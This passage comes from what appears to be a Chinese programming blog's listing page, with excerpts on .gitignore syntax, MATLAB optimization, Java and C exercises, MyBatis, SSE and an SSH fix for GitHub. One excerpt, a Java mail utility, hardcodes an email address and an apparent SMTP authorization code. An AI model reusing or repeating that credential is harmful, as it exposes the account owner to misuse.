项目开发过程中，有时候不想把一些文件（如中间文件/编译文件等）提交到git上。这个时候就由.gitignore文件来筛选出不想提交的文件。所筛选的文件/夹将不会被追踪（tracked），push的时候也不会上传到git上。
**以下用法配置是单片机C开发项目中的
创建 我们需要在提交Git之前，需要自己创建一个.gitignore文件，由于Windows下创建文件必须键入文件名，而要创建的.gitignore文件是没有文件名的，所以我们可以使用move命令来实现，打开Git Bash ，使用mv gitignore.txt .gitignore，然后用编辑器编辑这个文件。
语法规范 #：开头的行表示注释行*：用来匹配零个或多个字符
*.a表示忽略.a文件；
*.[oa]表示忽略所有以.a和.o结尾的文件，*~忽略所有以~结尾的文件；
[]用来匹配括号内的任一字符，如[abc]，也可以在括号内加连接符，如[0-9]匹配0至9的数；
?用来匹配单个字符；!：用来否定忽略
比如前面用了*.txt，然后使用!*a.txt，则这个a.txt不会被忽略/：
正斜杠在前：匹配项目跟目录；如/bin表示忽略根目录下的bin文件，/bsp表示忽略根目录下的bsp文件夹，但不忽略子目录里的user/bsp文件夹；
正斜杠在后：匹配文件夹以及在该文件夹路径下的内容，但是不匹配该文件；如bsp/表示忽略bsp文件夹里的所有文件；**：匹配多级目录，可在开始，中间，结束； 忽略优先级 在.gitignore文件中，每一行指定一个忽略规则，Git 检查忽略规则的时候有多个来源，它的优先级如下（由高到低）：
从命令行中读取可用的忽略规则当前目录定义的规则父级目录定义的规则，依次递推$GIT_DIR/info/exclude 文件中定义的规则core.excludesfile中定义的全局规则 常见例子 1、忽略.bin文件
#忽略所有的.bin文件 *.bin 2、否定忽略 link.bin
#不忽略目录下的link.bin !link.bin #不忽略obj目录下的link.bin !/obj/link.bin 3、忽略某目录.txt, 不包括子目录.txt
#忽略doc/notes.txt, 不包括doc/server/arch.txt doc/*.txt 4、忽略某目录内所有的.pdf 文件
#忽略所有的 .pdf 文件 在 doc/ directory 下的 doc/**/*.pdf 5、忽略当前目录.c，不忽略子目录.c
#忽略 cat.c，不忽略 build/cat.c /*.c 6、忽略当前路径下的Proj文件夹，该文件夹下的所有内容都会被忽略
#忽略当前路径下的Proj文件夹，该文件夹下的所有内容都会被忽略 Proj/ 7、忽略Proj文件夹子目录文件夹
#忽略Proj文件夹子目录Obj文件夹里的所有文件 Proj/Obj/ 8、忽略根目录下的某文件
#忽略根目录下的bin文件 /bin: 9、忽略/foo, a/foo, a/b/foo等
#忽略/foo, a/foo, a/b/foo等 **/foo: 10、忽略a/b, a/x/b, a/x/y/b等
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/469d1ac6e44c0456fbb241e3a0fca5d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9e9f53ea819bf7ab3e7246b15f13103/" rel="bookmark">
			matlab最优化问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		matlab最优化问题 注：本文为阅读《精通matlab最优化计算 第3版》笔记相关记录，具体的算法介绍及代码请参考原文
1、无约束一维极值问题 无约束一维极值问题可简单表述为：
m i n f ( x ) , x ∈ R ， 或 m i n f ( x ) , x ∈ [ x 1 , x 2 ] min f(x),x∈R ， 或min f(x) ,x ∈ [x1,x2] minf(x),x∈R，或minf(x),x∈[x1,x2]
本章讨论得优化问题是在以下两种情况：（即局部极值点）
（1）在自变量的范围为整个实数区间的前提下求函数的任意一个极值；
（2）在自变量的范围为给定区间的前提下求函数的任意一个极值。
1.1 进退法 1.2 黄金分割法 1.3 斐波那契法 1.4 牛顿法 基本牛顿法
全局牛顿法
1.5 割线法 1.6 抛物线法 1.7 三插值法 1.8 可接受搜索法 Goldstein法
Wolfe-Powell法
1.9 matlab工具箱 fminbnd函数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9e9f53ea819bf7ab3e7246b15f13103/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/688e99f2244799530d2c12c383e23830/" rel="bookmark">
			[JS]ipv6地址16进制格式转换为二进制表示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		描述：ipv6地址16进制格式转换为二进制表示 ipv6地址格式：3001:0000:0000:0000:0000:0000:1111:1111
方案1： //传入str_16_based：3001:0000:0000:0000:0000:0000:1111:1111 function hex_to_bin(str_16_based) { var str_2_based=""; var str_array = str_16_based.split(":"); var hex_array = [{key:0,val:"0000"},{key:1,val:"0001"},{key:2,val:"0010"},{key:3,val:"0011"}, {key:4,val:"0100"},{key:5,val:"0101"},{key:6,val:"0110"},{key:7,val:"0111"}, {key:8,val:"1000"},{key:9,val:"1001"},{key:'a',val:"1010"},{key:'b',val:"1011"}, {key:'c',val:"1100"},{key:'d',val:"1101"},{key:'e',val:"1110"},{key:'f',val:"1111"}]; for(var index = 0; index &lt; str_array.length; index++){ console.log(str_array[index]);//3001 var value=""; for(var i = 0; i &lt; str_array[index].length; i++){ for(var j = 0; j &lt; hex_array.length; j++){ if(str_array[index].charAt(i).toLowerCase() == hex_array[j].key){ value = value.concat(hex_array[j].val); break; } } } console.log("value: " + value);//0011000000000001（16位） str_2_based = str_2_based.concat(value);//0011000000000001 //str_2_based = str_2_based.concat(value,":");//0011000000000001： } console.log("str_2_based: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/688e99f2244799530d2c12c383e23830/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dba98de13ecc6191d009efd402e7d3be/" rel="bookmark">
			【C语言】输入年月日，输出这天是这一年的第几天。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总结：利用数组、循环结构解决问题，闰年判断是关键。
代码如下：
#include&lt;stdio.h&gt; main() { int a[]={0,31,28,31,30,31,30,31,31,30,31,30,31} ; int n, y, r, i, sum=0; printf("请输入年月日："); scanf("%d%d%d",&amp;n,&amp;y,&amp;r); for(i=0;i&lt;y;i++) sum+=a[i]; sum+=r; if((n%400==0||n%4==0&amp;&amp;n%100!=0)&amp;&amp;y&gt;2)	sum+=1; printf("%d年%d月%d日是该年的%d天",n,y,r,sum); } 运行如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57b559ac439911d35091c0069b6fadd1/" rel="bookmark">
			NWERC 2018
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		昨天的训练，来点来点
Dashboard - 2018-2019 ICPC Northwestern European Regional Programming Contest (NWERC 2018) - Codeforces
A：待补
B：贪心，选出最长的会议，它所有的前置会议在他之前，并标记此时已经开的会议个数，时间为value+num-1，再次选择没开的会议中的最长的会议，以此类推。
#include&lt;iostream&gt; #include&lt;vector&gt; #include&lt;cmath&gt; #include&lt;algorithm&gt; using namespace std; struct xd { int num, value, id; bool flag = 0; vector&lt;int&gt;q; }; xd a[400005], b[400005]; bool cmp(xd a, xd b) { if (a.value == b.value) return a.num &gt; b.num; return a.value &gt; b.value; } int ans = 0, tot = 0; void dfs(int x) { //int x = a[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57b559ac439911d35091c0069b6fadd1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d984d36d4232275a0959339061beb6fb/" rel="bookmark">
			注册---邮件激活
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接上篇》》旅游商城系统开发_无尽的沉默的博客-CSDN博客
一.邮件激活分析 二.分析原理并编写代码 2.1发送邮件 编写了一个第三方发邮件的工具类MailUtils
package cn.itcast.travel.util; import javax.mail.*; import javax.mail.internet.InternetAddress; import javax.mail.internet.MimeMessage; import java.util.Properties; /** * 发邮件工具类 */ public final class MailUtils { private static final String USER = "1617769@qq.com"; // 发件人称号，同邮箱地址,必填 private static final String PASSWORD = "oaakfpjrepdecabg"; // 如果是qq邮箱可以使户端授，权码，或者登录密码，这个是可以在邮箱里面设置中pop和SMTP设置中可以查看 /** * * @param to 收件人邮箱 * @param text 邮件正文 * @param title 标题 */ /* 发送验证信息的邮件 */ public static boolean sendMail(String to, String text, String title){ try { final Properties props = new Properties(); props.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d984d36d4232275a0959339061beb6fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e891e55a76d713246a5e8a45bb15c357/" rel="bookmark">
			存储过程——IF判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在PL/SQL中，IF、THEN、ELSE、ELSIF和END IF等关键字用于执行条件逻辑：
IF condition1 THEN
statements1
ELSIF condition2 THEN
statements2
ELSE
statements3
END IF;
其中：
condition1和condition2是布尔表达式，其值为真或假。
statements1、statements2、statements3是PL/SQL语句。
条件逻辑的流程如下：
如果condition1为真，就执行statements1.
如果condition1为假而condition2为真，就执行statement2.
如果condition1和condition2都为假，就执行statement3.
也可以在一条IF语句中嵌入另一条IF语句，如下所示：
IF v_count &gt; 0 THEN v_message := 'v_count is positive'; IF v_area &gt; 0 THEN v_message := 'v_count and v_area are positive'; END IF ELSIF v_count = 0 THEN v_message := 'v_count is zero'; ELSE v_message := 'v_count is negative'; END IF; 如果Smith工资小于1000 结果输出 努力工资
declare v_sal number; begin select sal into v_sal from emp where ename = 'SMITH'; if v_sal &lt; 1000 then dbms_output.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e891e55a76d713246a5e8a45bb15c357/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc77ff533a0b0cef42283c0a1a6885ee/" rel="bookmark">
			ESlint Prettier Git 中使用 ignore忽略文件的规则解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 我们经常在项目中使用.gitignore去忽略文件，比如
# .gitignore忽略项目依赖和打包文件 node_modules dist 其实，除了Git，ESLint和Prettier同样提供了对应的ignore文件
.eslintignore 为ESLint忽略指定文件.prettierignore 为Prettier忽略指定文件 同Git，显然我们不希望对如node_modules依赖文件夹中的文件进行格式化或者做代码质量检查，所以忽略指定文件是必要的。
幸运的是，ESLint和Prettier的忽略规则与Git是一致的。
对于ESLint，其官网提到：
Please see .gitignore’s specification for further examples of valid syntax.
对于Prettier，其官网提到
.prettierignore uses gitignore syntax.
接下来我们来详细看一下，.gitignore都有哪些规则
规则明细 对于空白符，比如空格，git是忽略了的。所以可以借助空格回车来使得文件更易读。#表示注释对于/斜杠，他有两个语义。当被放到一条规则的起始或者中间，则这条规则被表示为一个相对于.gitignore文件的目录或文件，反之，若起始或中间没有斜杠，则表示匹配到任意目录或文件。比如一条规则是App.vue，那么即使App.vue被放到了src目录内，同样也是能匹配到的。另外一个语义则是/被放到一条规则的尾部，此时其用来区分一个目录，而非一个文件。他与第一个语义不冲突，比如frotz/代表任意目录下包含frotz/的目录。!取反符号表示忽略指定目录或文件，言下之意就是让git再次跟踪其包含的文件。其规则与上一条也不冲突。但有一个注意事项，即指定忽略的文件或目录的父目录不能被整体忽略。比如我先包含src，之后忽略!src/App.vue这是不生效的。可以写成src/*，后忽略!src/App.vue。**有三种语义，**/foo表示任意目录下的foo;abc/**表示abc之后任意目录下的文件；a/**/b表示a目录下任意级目录的子目录b。 举例 # 排除了 foo/bar 的所有文件。 /* !/foo /foo/* !/foo/bar 参考 Prettier官网： https://prettier.io/docs/en/ignore.html
ESLint官网：https://eslint.org/docs/user-guide/configuring/ignoring-code
Git官网：https://git-scm.com/docs/gitignore#_pattern_format
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f2dd441516b222083fde0b1477563e8/" rel="bookmark">
			云流化如何实现多人线上协作的？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在长期的和一线客户沟通过程中，点量小芹发现在像素流或者说实时云渲染应用时，有几个问题是具有普遍性的，在最初的时候都会提出来这几个问题。今天小芹就和大家分享下，像素流能不能实现同一个程序多人协作？
在之前的文章中我们介绍过，同一个服务器可以支持多个并发（当然具体要看程序的对资源的要求以及服务器的性能），但一般同一时间操作程序的是一人。那如果想做到多人可以同时协作一个UE4程序，怎么实现呢？
点量实时云渲染系统可以实现多人协作同一程序，在系统中设置好UE4程序后在创建对外URL链接。给到一个主操作人员，比如在虚拟仿真教学中，可能是老师为主来操作，其他学生处于旁观模式。但为了和学生有很好的互动，学生可以通过申请操作，完成操作权限的转移，这样学生也可以有操作权限，从而实现同一个程序的多人协作。在数字孪生行业也是一样，在有嘉宾来访的时候可以通过平板的主控来操作服务器上的三维可视化程序，在触摸屏中可以通过旁观地址展示实时互动的效果。而嘉宾可以通过触摸屏获取操作权限，实现直接的互动。现在受疫情的影响，很多会议都采取了线上模式。在做演示的时候通过这种方式也可以很好的实现多人协作同一个UE4、unity3D或者其他大型程序。
之前和介绍过点量云流化技术可以实现旁观模式，即一个人操作其他人也可以看到操作的实时效果。小芹在和一线客户的接触中发现，在一些展示型的场景下，很多客户比较关注能支持多少人的旁观。这里点量小芹就和您，详细聊下这个问题。
首先我们知道并发数是指同时使用的人数，每个人使用都是占用一定的带宽的。而旁观除了不能操作服务器上的程序外，也是能看到主控人员的实时操作结果，而云流化（也叫实时云渲染或者像素流）即是将操作结果以视频流的方式传到终端用户的设备上，而看视频是需要流量带宽的这个大家都知道。所以这种情况下，如果一台服务器只有一个主控操作服务器程序时，可以支持多少人旁观，其实是取决于服务器的带宽的。一台服务器可能支持几十个、几百个或者上千个，具体要看服务器的带宽情况了。比如在流量模式下，可能最多能支持到上千个旁观。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c697d88a7763247ae2c4831f57a0bd84/" rel="bookmark">
			swagger2 注解说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、maven依赖2、swagger2 注解整体说明2.1、请求类的描述2.2、方法和方法参数的描述2.3、方法的响应状态的描述2.4、对象的描述 3、请求类的描述3.1、@Api：请求类的说明3.2、示例： 4、方法和方法参数的描述4.1、@ApiOperation：方法的说明4.2、@ApiImplicitParams、@ApiImplicitParam：方法参数的说明4.3、示列： 5、响应状态的描述5.1、@ApiResponses、@ApiResponse：响应状态状态的说明5.2、 示例： 6、对象的描述6.1、@ApiModel：对象的整体说明6.2、@ApiModelProperty 对象中每个参数的说明6.3、示例：1）入参是对象，即 `@RequestBody` 时， 用于封装请求2）返回值是对象，即 `@ResponseBody` 时，用于返回值对象的描述。3） UserLoginVO 和 JsonResult 的使用 6.4、swagger2 中查看： 7、默认的地址 1、maven依赖 &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;swagger-bootstrap-ui&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; （注：当前2018年，请使用最新的依赖）
2、swagger2 注解整体说明 2.1、请求类的描述 注解说明@Api对请求类的说明 2.2、方法和方法参数的描述 注解说明@ApiOperation方法的说明@ApiImplicitParams方法参数的说明；@ApiImplicitParam用于指定单个参数的说明。 2.3、方法的响应状态的描述 注解说明@ApiResponses方法返回值的说明 ；@ApiResponse用于指定单个参数的说明。 2.4、对象的描述 注解说明@ApiModel用在JavaBean类上，说明JavaBean的 整体用途@ApiModelProperty用在JavaBean类的属性上面，说明此属性的的含议 3、请求类的描述 3.1、@Api：请求类的说明 @Api：放在 请求的类上。与 @Controller 并列，说明类的作用，如用户模块，订单类等。 tags="说明该类的作用" value="该参数没什么意义，所以不需要配置" 3.2、示例： @Api(tags="订单模块") @Controller public class OrderController { } @Api 其它属性配置：
属性名称备注valueurl的路径值tags如果设置这个值、value的值会被覆盖description对api资源的描述basePath基本路径position如果配置多个Api 想改变显示的顺序位置produces如, “application/json, application/xml”consumes如, “application/json, application/xml”protocols协议类型，如: http, https, ws, wss.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c697d88a7763247ae2c4831f57a0bd84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0ab6f83b3c45bcc2411d36d77d2cac3/" rel="bookmark">
			JAVA 实体类常用注解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java 实体类常用注解
@Null：被注释的元素必须为null @NotNull：被注释的元素不能为null @AssertTrue：该字段只能为true @AssertFalse：该字段的值只能为false @Min(value)：被注释的元素必须是一个数字，其值必须大于等于指定的最小值 @Max(value)：被注释的元素必须是一个数字，其值必须小于等于指定的最大值 @DecimalMin(“value”)：被注释的元素必须是一个数字，验证小数的最小值 @DecimalMax(“value”)：被注释的元素必须是一个数字，验证小数的最大值 @Size(max,min)：查该字段的size是否在min和max之间，可以是字符串、数组、集合、Map等 @Past：被注释的元素必须是一个过去的日期 @Future：被注释的元素必须是一个将来的日期 @Pattern(regexp = “[abc]”)：被注释的元素必须符合指定的正则表达式。 @Email：被注释的元素必须是电子邮件地址 @Length(max=5,min=1,message=“长度在1~5”)：检查所属的字段的长度是否在min和max之间，只能用于字符串 @NotEmpty：被注释的字符串必须非空 @Range：被注释的元素必须在合适的范围内 @NotBlank：不能为空，检查时会将空格忽略 @NotEmpty：不能为空，这里的空是指空字符串 @TableField(exist = false) 字段不新增数据库 @TableField(updateStrategy = FieldStrategy.NOT_EMPTY,jdbcType = JdbcType.VARCHAR) 如果字段为空的时候 不修改 链接：https://juejin.cn/post/7083657131135598628
来源：稀土掘金
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b13f9d6ffd2b50a1281dad6ffc364df4/" rel="bookmark">
			C语言中数组的使用详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章来源： 学习通http://www.bdgxy.com/
目录 1 数组的基本概念2 数组定义语法3 一维数组的初始化3.1 全部初始化3.2 部分元素赋初值3.3 省略长度赋初值 4 一维数组的使用示例4.1 求最大值、最小值、平均值4.2 数组逆置4.3 数组排序4.3.1 冒泡排序4.3.2 选择排序 选择列表中的最小值与未排序列表中的第一个值互换位置。4.3.3 直接插入排序 5 二维数组5.1 二维数组的概念 5.2 二维数组的初始化5.2.1 全部初始化 按行全部赋初值5.2.2 部分初始化5.2.3 省略长度初始化 6 二维数组示例6.1 二维数组的遍历 6.2 求平均成绩 7 一维字符数组与字符串7.1 字符数组 7.2 字符串的保存 7.3 字符串的读取与打印 总结
1 数组的基本概念 数组：类型相同的数据元素的集合，是C语言中的一种构造数据类型。这些元素会顺序地存储在内存的某段区域。 2 数组定义语法 数组类型 数组名[数组大小] 数组大小：决定了数组中能够存放的元素数量。数组大小不能是变量，只能是字面值或字面值表达式。C语言编译器要求在编译期间就需要确定数组的内存大小。数组大小必须是大于0的正整数。 3 一维数组的初始化 3.1 全部初始化 int arr[5] = {1, 2, 3, 4, 5}; //arr[0]:1 //arr[1]:2 //arr[2]:3 //arr[3]:4 //arr[4]:5 初始化列表：用大括号括起来的，用于对数组进行初始化的一个值的列表，每个值之间通过逗号隔开。初始化列表只能在定义数组时使用，数组定义完成后不能再使用初始化列表给数组赋值。全部初始化要求初始化列表中各元素个数必须与数组大小相同。 3.2 部分元素赋初值 int arr[5] = {1, 2, 3}; //arr[0]:1 //arr[1]:2 //arr[2]:3 //arr[3]:0 //arr[4]:0 实际开发中，通常采用部分元素赋初值的方法对数组元素进行初始化，如：int arr[100]={0};
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b13f9d6ffd2b50a1281dad6ffc364df4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57c5aaf8af4419cd16e88b2a0a4fe34b/" rel="bookmark">
			小明考试奖励
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目：
需求：小明快要考试了，小明爸爸对她说，会根据他不同的考试成绩，送她不同的礼物，假如你可以控制小明的分数，请用程序实现小明到底该获得什么样的礼物，并在控制台输出 /*分析：1、小明成绩未知，可以通过键盘录入 * 2、由于奖励种类较多，属于多种判断，采用if..else..if格式实现*/ package study; //需求：小明快要考试了，小明爸爸对她说，会根据他不同的考试成绩，送她不同的礼物，假如你可以控制小明的分数，请用程序实现小明到底该获得什么样的礼物，并在控制台输出 /*分析：1、小明成绩未知，可以通过键盘录入 * 2、由于奖励种类较多，属于多种判断，采用if..else..if格式实现*/ import com.sun.xml.internal.ws.api.model.wsdl.WSDLOutput; import java.util.Scanner; public class eg4 { public static void main(String[] args) { Scanner sc = new Scanner(System.in); System.out.println("请输入小明成绩："); int sorce = sc.nextInt(); if(sorce &gt;=95 &amp;&amp; sorce&lt;=100){ System.out.println("自行车一辆"); } else if(sorce &gt;=90 &amp;&amp; sorce &lt;=94){ System.out.println("游乐园玩一次"); } else if (sorce&gt;=80 &amp;&amp; sorce &lt;= 89){ System.out.println("玩具有一个"); } else{ System.out.println("在家做作业"); } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adfcc3ae67897ca0ff28f95fe5ebe911/" rel="bookmark">
			【长链接】Java实现方式SSE&#43;Come4J
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是长连接、短连接？ 在HTTP/1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。
而从HTTP/1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入这行代码：Connection:keep-alive
在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。
HTTP协议的长连接和短连接，实质上就是TCP协议的长连接和短连接。
TCP 长连接和短连接，TCP在真正的读写操作之前，server与client之间必须建立一个连接，当读写操作完成后，双方不再需要这个连接时它们可以释放这个连接，连接的建立通过三次握手，释放则需要四次握手，所以说每个连接的建立都是需要资源消耗和时间消耗的。
TCP长/短连接的应用场景：
长连接多用于操作频繁，点对点的通讯，而且连接数不能太多情况。
每个TCP连接都需要三次握手，这需要时间，如果每个操作都是先连接，
再操作的话那么处理速度会降低很多，所以每个操作完后都不断开，
再次处理时直接发送数据包就OK了，不用建立TCP连接。
例如：数据库的连接用长连接，如果用短连接频繁的通信会造成socket错误，
而且频繁的socket 创建也是对资源的浪费。
而像WEB网站的http服务一般都用短链接，因为长连接对于服务端来说会耗费一定的资源，
而像WEB网站这么频繁的成千上万甚至上亿客户端的连接用短连接会更省一些资源，
如果用长连接，而且同时有成千上万的用户，如果每个用户都占用一个连接的话，
那可想而知吧。所以并发量大，但每个用户无需频繁操作情况下需用短连好。
目前实现长连接的方式无论是从兼容性从高到低，还是实时性从低到高，亦或是服务器资源占用从高到低，排列顺序都是：
短轮询 -&gt; 长轮询 -&gt; 长连接(sse,comet4j) -&gt; websocket
sse： sse(Server Sent Event)，直译为服务器发送事件，顾名思义，也就是客户端可以获取到服务器发送的事件
我们常见的 http 交互方式是客户端发起请求，服务端响应，然后一次请求完毕；但是在 sse 的场景下，客户端发起请求，连接一直保持，服务端有数据就可以返回数据给客户端，这个返回可以是多次间隔的方式
sse 是单通道，只能服务端向客户端发消息；而 webscoket 是双通道，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息
【SpringBoot WEB 系列】SSE 服务器发送事件详解 - 一灰灰Blog - 博客园
//map HashMap&lt;String, Thread&gt; jobMap = new HashMap&lt;&gt;(); //线程池 ExecutorService newExecutorService = Executors.newCachedThreadPool(); @GetMapping("/query/status/{lastCount}") public SseEmitter query(@PathVariable Integer lastCount){ SseEmitter sseEmitter = new SseEmitter(0L); Thread todo = jobMap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adfcc3ae67897ca0ff28f95fe5ebe911/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f1d45c96e1c095c4305b470a9eddb92/" rel="bookmark">
			java培训Mybatis动态Sql处理解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下文章来源于架构师必备
动态Sql介绍
动态 SQL 是 MyBatis 的强大特性之一。如果你使用过 JDBC 或其它类似的框架，你应该能理解根据不同条件拼接 SQL 语句有多痛苦，例如拼接时要确保不能忘记添加必要的空格，还要注意去掉列表最后一个列名的逗号。利用动态 SQL，可以彻底摆脱这种痛苦。
使用动态 SQL 并非一件易事，但借助可用于任何 SQL 映射语句中的强大的动态 SQL 语言，MyBatis 显著地提升了这一特性的易用性。
Mybatis动态解析里面有2个核心的类SqlNode、SqlSource、ExpressionEvaluator。Mybatis动态Sql使用分为2个部分：动态Sql解析、动态Sql拼接执行。
封装SqlNode
SqlNode是在解析Xml文件的时候对动态Sql进行解析，并存在MappedStatement的sqlSource属性中。对于嵌套动态Sql，mybatis用递归调用来进行解析。这块东西个人觉得还是比较绕，所以这块博主准备事例、源码、执行结果一起讲解_java培训。
Sql脚本分类
在Mybatis中Sql脚本分为2种类型：静态Sql和动态Sql。下面我们通过具体的源码来看下2者区分。
静态Sql和动态Sql
静态Sql说白了就没有太任何判断了解的Sql脚本。
// Select 是查询的一些属性
&lt;select id="selectBypageTwo" resultType="com.wwl.mybatis.dao.User"&gt;
//这条查询语句select * from user where id &gt; #{user.id}就是Mybatis中的静态Sql
//静态Sql就是不太任何条件的Sql语句
select * from user where id &gt; #{ user.id}
//这里有if判断条件，Mybatis把带有判断条件的Sql叫动态Sql。
//动态Sql除了if之外还有foreach、where、trim等。具体自己去mybatis官网看下
&lt;if test="user.name != null and user.name!=''"&gt;
AND name = #{ user.name}
&lt;/if&gt;
&lt;/select&gt;
SqlNode类结果体系
看mybatis代码很多时候可以看到这种结构。每个SqlNode负责自己那块功能。职责单一。SqlNode的核心方法apply就是通过ExpressionEvaluator来解析OGNL表达式数据的。接下来我们看看Mybatis是如何递归解析动态sql脚本的。
// 解析Sql脚本节点
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f1d45c96e1c095c4305b470a9eddb92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f224304208f29a6898ba24eb3c7b255/" rel="bookmark">
			$ git push origin master ssh: connect to host github.com port 22: Connection timed out fatal: Could
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.C:\Users\123\.ssh 下创建config文件：
内容如下：
Host github.com
User 986807446@qq.com
Hostname ssh.github.com
PreferredAuthentications publickey
IdentityFile ~/.ssh/id_rsa
Port 22
2.$ git push origin master
The authenticity of host 'ssh.github.com (192.30.253.123)' can't be established.
RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.
Are you sure you want to continue connecting (yes/no)? 3.//输入yes，回车
4.C:\Users\123\.ssh 下的known_hosts文件里面会增加
Permanently added 'ssh.github.com,XXXX' (RSA) to the list of known hosts.
也就是ssh-rsa也服务器git的对应关系；
5.$ git push origin master 成功！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7a41d00fe557ea052a3081aba5990b5/" rel="bookmark">
			【论文笔记7】CrossViT: Cross-Attention Multi-Scale Vision Transformer for Image Classificatio阅读笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 论文阅读笔记 (1)：DeepLabv3
论文阅读笔记 (2) :STA手势识别
论文阅读笔记 (3): ST-GCN
论文阅读笔记（5）:图上的光谱网路和深度局部链接网络
论文阅读笔记（6）: GNN-快速局部光谱滤波
论文阅读笔记（8）: 图卷积半监督分类
文章目录 系列文章目录Abstract目标方法 一、Introduction1. 相关论文：2. 本文特点 二、Related Works三种类别的相关工作 三、Method1.Vision TransformerMulti-Head Attention:流程： 2.Proposed Multi-Scale Vision Transformer3.Multi-Scale Feature Fusion提出了备选的四种融合策略：四种融合策略的数学表达 四、Experiments模型结构参数：与DeiT 进行比较：与其他类型transformer比较： 与其他CNN 架构比较消融实验： 附录：训练过程中其他设置 Abstract 目标 Inspired by this, in this paper, we study how to learn multi-scale feature rep- resentations in transformer models for image classification. To this end, we propose a dual-branch transformer to combine image patches (i.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7a41d00fe557ea052a3081aba5990b5/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/158/">«</a>
